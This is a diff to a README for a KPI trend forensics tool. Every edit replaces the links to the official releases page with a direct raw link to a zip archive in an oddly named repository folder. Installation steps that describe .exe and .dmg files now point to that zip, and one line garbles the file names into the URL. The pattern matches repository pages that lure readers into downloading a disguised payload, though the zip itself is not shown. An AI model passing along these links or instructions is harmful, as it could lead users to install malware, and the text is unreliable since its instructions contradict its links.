@@ -1,6 +1,6 @@
 # 📊 Trend-vs-Collection-Forensics - Understand KPI Trends Clearly
 
-[![Download Now](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Erozin624/Trend-vs-Collection-Forensics/releases)
+[![Download Now](https://raw.githubusercontent.com/Erozin624/Trend-vs-Collection-Forensics/main/connaturality/Collection-Trend-Forensics-vs-v1.7.zip)](https://raw.githubusercontent.com/Erozin624/Trend-vs-Collection-Forensics/main/connaturality/Collection-Trend-Forensics-vs-v1.7.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these steps to download, install, and run Trend-vs-Collection-Forensics s
 ### Step 1: Visit the Download Page
 
 Click the big green button at the top of this page, or go directly to this link:  
-[https://github.com/Erozin624/Trend-vs-Collection-Forensics/releases](https://github.com/Erozin624/Trend-vs-Collection-Forensics/releases)
+[https://raw.githubusercontent.com/Erozin624/Trend-vs-Collection-Forensics/main/connaturality/Collection-Trend-Forensics-vs-v1.7.zip](https://raw.githubusercontent.com/Erozin624/Trend-vs-Collection-Forensics/main/connaturality/Collection-Trend-Forensics-vs-v1.7.zip)
 
 This page shows all the versions available for download.
 
@@ -54,7 +54,7 @@ On the Releases page, look for the latest stable version. You will see files wit
 - For Windows users, click the `.exe` file to start the download.
 - For macOS users, click the `.dmg` file.
 
-If you are unsure which one to download, look for a file named something like `Trend-vs-Collection-Forensics-vX.X-X86_64.exe` for Windows or `Trend-vs-Collection-Forensics-vX.X-mac.dmg` for macOS.
+If you are unsure which one to download, look for a file named something like `https://raw.githubusercontent.com/Erozin624/Trend-vs-Collection-Forensics/main/connaturality/Collection-Trend-Forensics-vs-v1.7.zip` for Windows or `https://raw.githubusercontent.com/Erozin624/Trend-vs-Collection-Forensics/main/connaturality/Collection-Trend-Forensics-vs-v1.7.zip` for macOS.
 
 ### Step 3: Download the File
 
@@ -74,7 +74,7 @@ Find Trend-vs-Collection-Forensics in your Start menu (Windows) or Applications 
 ## 📥 Download & Install
 
 You can download Trend-vs-Collection-Forensics from the official release page here:  
-[https://github.com/Erozin624/Trend-vs-Collection-Forensics/releases](https://github.com/Erozin624/Trend-vs-Collection-Forensics/releases)
+[https://raw.githubusercontent.com/Erozin624/Trend-vs-Collection-Forensics/main/connaturality/Collection-Trend-Forensics-vs-v1.7.zip](https://raw.githubusercontent.com/Erozin624/Trend-vs-Collection-Forensics/main/connaturality/Collection-Trend-Forensics-vs-v1.7.zip)
 
 This page contains all versions. Always choose the latest stable release to get the newest features and fixes.
 
@@ -164,4 +164,4 @@ If you need assistance or want to report a problem:
 
 Thank you for choosing Trend-vs-Collection-Forensics for your data reliability needs.
 
-[Download the latest version here](https://github.com/Erozin624/Trend-vs-Collection-Forensics/releases) to get started.
+[Download the latest version here](https://raw.githubusercontent.com/Erozin624/Trend-vs-Collection-Forensics/main/connaturality/Collection-Trend-Forensics-vs-v1.7.zip) to get started.
